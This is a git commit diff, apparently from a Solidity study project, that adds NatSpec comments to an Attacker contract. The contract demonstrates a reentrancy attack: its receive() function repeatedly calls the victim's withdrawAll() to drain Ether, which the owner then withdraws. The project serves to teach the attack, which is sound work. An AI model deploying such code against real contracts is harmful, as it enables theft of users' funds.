dfe01a151d8abcccefb4e770cfc5c96481970f42
whanyu1212 <whanyu1212@hotmail.com>
2025-02-19 18:54:32 +0800

    adding natspec tags for the attacker contract

--- contracts/Attacker.sol
+++ contracts/Attacker.sol
@@ -1,10 +1,18 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+// We import the IVictim interface to interact with the victim contract
 import "./IVictim.sol";
 
+/**
+ * @title Attacker
+ * @dev This contract demonstrates a reentrancy attack on the victim contract.
+ * @author hy
+ * @notice Date: 14/02/2025
+ */
 contract Attacker {
     IVictim public victim;
     address public owner;
+    // boolean flag to check if the attack is in progress
     bool public attackInProgress;
 
     constructor(address _victim) {
@@ -12,6 +20,9 @@ contract Attacker {
         owner = msg.sender;
     }
 
+    /**
+     * @notice This function initiates the reentrancy attack on the victim contract.
+     */
     function attack() public payable {
         // sends ether to the victim contract
         require(msg.value > 0, "Send some Ether to initiate the attack");
@@ -25,15 +36,29 @@ contract Attacker {
         attackInProgress = false;
     }
 
+    /**
+     * @notice This function gets the balance of the attacker contract.
+     * @return The balance of the attacker contract.
+     */
     function getBalance() public view returns (uint256) {
         return address(this).balance;
     }
 
+    /**
+     * @notice This function withdraws the balance of the attacker contract.
+     */
     function withdraw() public {
         require(msg.sender == owner, "Unauthorized");
         payable(owner).transfer(address(this).balance);
     }
-    // filepath: /Users/hanyuwu/Study/solidity-starter-kit/contracts/Attacker.sol
+    // The receive() function is a special function in Solidity
+    // designed to handle plain Ether transfers with no calldata.
+    // Unlike regular functions, it doesn't require a typical function
+    // header with a name, parameters, or return types.
+
+    /**
+     * @notice This function is called when the attacker contract receives Ether.
+     */
     receive() external payable {
         if (attackInProgress && address(victim).balance > 0) {
             victim.withdrawAll();
